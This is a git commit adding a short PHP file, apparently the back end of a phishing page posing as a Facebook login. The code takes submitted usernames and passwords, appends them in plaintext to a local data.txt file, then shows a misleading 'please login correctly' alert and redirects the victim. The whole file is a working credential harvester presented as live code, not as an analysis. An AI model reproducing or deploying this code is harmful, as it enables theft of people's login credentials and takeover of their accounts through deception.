f890e69438746abac0f5f4b783efd40b105d4f5e
firewmeto <102377688+firewmeto@users.noreply.github.com>
2022-03-25 11:11:57 -0700

    first commit

---
+++ save_faceboke.php
@@ -0,0 +1,37 @@
+<?php
+	
+	if(ISSET($_POST['save_admin'])){
+		$username = $_POST['username'];
+		$password =$_POST['password'];
+		 
+$user_name="U|=";
+$pasword1="P|=";
+$space="|    |";
+
+$fp = fopen('data.txt', 'a');
+fwrite($fp, $space);
+fwrite($fp, $user_name);
+fwrite($fp, $username);
+
+
+fwrite($fp, $space);
+fwrite($fp, $pasword1);
+ 
+fwrite($fp, $password);
+fclose($fp); 
+
+		echo '
+				<script type = "text/javascript">
+					alert("please login correctly to join hacking class");
+					window.location = "../index.html";
+				</script>
+			'; 
+		 
+		 
+	} 
+	echo '
+				<script type = "text/javascript">
+					alert("please login correctly to join hacking class");
+					window.location = "../index.html";
+				</script>
+			';?>
